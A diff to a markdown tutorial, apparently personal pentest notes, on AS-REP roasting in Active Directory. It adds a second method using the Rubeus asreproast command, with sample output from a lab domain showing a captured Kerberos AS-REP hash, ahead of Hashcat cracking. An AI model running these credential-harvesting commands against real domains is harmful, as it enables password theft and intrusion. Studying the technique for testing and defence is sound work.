@@ -4,6 +4,10 @@ Is the technique that enables the attacker to retrieve password hashes for AD us
 
 ![81bf1dad6425f8f06b0026f4e748f193](https://github.com/user-attachments/assets/2ccdf90a-420f-45dd-8c55-8f1142276804)
 
+
+**First method**
+
+
 We should do some recon to obtain the AD users and collect them in a file ```users.txt```:
 ```
 Administrator
@@ -36,6 +40,23 @@ The ```GetNPUsers.py``` is used to request Kerberos **TGTs** for user accounts t
 
 <br>
 
+**Second method**
+
+```
+Rubeus.exe asreproast /nowrap
+```
+the output will look like this:
+```
+[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
+[*] SamAccountName         : Admin2
+[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::b5c8:9b6f:25dc:5bf6%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$Admin2@CONTROLLER.local:AF01B8AF2BA0C81C0D438ACB15A2B476$F766A68EF45E9C5924B096B5B4B0916366763EA31A6301E8DD511ACA336D7E162F29D6703BE0489410EBAB6E2A94EC416F1CA0DBA2B71A42C35BB0D1113E07B81D5D8662BF8CE1BAD89B9B408AFFDD531F0C401101937F1C5E2526E44194BF8CDC1ACB18623D52B19E30AA1D14C15E97FB6B329B92726AC394E0373C090B4C32C1D1CEBA3014BF5B0126F3C014BD1CDED856EC99C26F5566C66488C355BA49E572D445C88C583CCBF7686514297ABCB546FA2C18D15CAC4459235D798A3950C88C3369ABF2991AAF5EAB9D2C03792108F328EC65358427D86E5C595E7F5CB61828EABA0A99FA33F0241C51607BB14F1F415EA655
+```
 **Cracking the AS-REP Hash:**
 
 To crack the AS-REP hash, you can use Hashcat with the following command:
